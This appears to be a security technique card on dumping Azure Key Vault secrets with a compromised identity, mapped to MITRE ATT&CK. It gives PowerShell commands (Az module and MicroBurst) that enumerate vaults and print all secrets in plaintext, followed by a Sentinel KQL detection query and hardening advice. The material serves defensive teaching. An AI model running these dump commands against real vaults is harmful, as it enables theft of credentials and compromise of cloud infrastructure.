# [CA-UNSC-007]: Azure Key Vault Secret Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-007 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / Azure |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure Key Vault stores application secrets (API keys, DB passwords). Access is controlled via Access Policies or RBAC. If an attacker compromises an identity (User or Service Principal) with `Secret/Get` permissions, they can dump all stored secrets.
- **Attack Surface:** Azure Key Vault Control Plane.
- **Business Impact:** **Cloud Infrastructure Compromise**. Secrets often provide access to databases, storage accounts, and third-party APIs.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** `Key Vault Secrets User` role or Access Policy `Get/List`.
- **Tools:**
    - [MicroBurst](https://github.com/NetSPI/MicroBurst)
    - Azure CLI (`az keyvault`)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration**
List accessible vaults.
```powershell
Get-AzKeyVault
```

**Step 2: Dump Secrets**
Iterate and retrieve secret values.
```powershell
# Using Az Module
$Secrets = Get-AzKeyVaultSecret -VaultName "TargetKV"
foreach ($Secret in $Secrets) {
    Get-AzKeyVaultSecret -VaultName "TargetKV" -Name $Secret.Name -AsPlainText
}

# MicroBurst
Get-AzKeyVaultSecrets -VaultName "TargetKV" -Verbose
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Monitor
| Source | Operation | Filter Logic |
|---|---|---|
| **KeyVault** | `SecretGet` | High volume of `SecretGet` events from a single IP or Identity within a short timeframe. |

#### 5.2 Sentinel (KQL)
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where OperationName == "SecretGet"
| summarize Count=count() by CallerIPAddress, identity_claim_upn_s
| where Count > 10
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **RBAC:** Use **Azure RBAC** for Key Vault instead of Access Policies (which grant access to the entire vault). RBAC allows scoping access to specific secrets.
*   **Private Link:** Restrict Key Vault access to private endpoints, blocking public internet access.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [LAT-CLOUD-001]
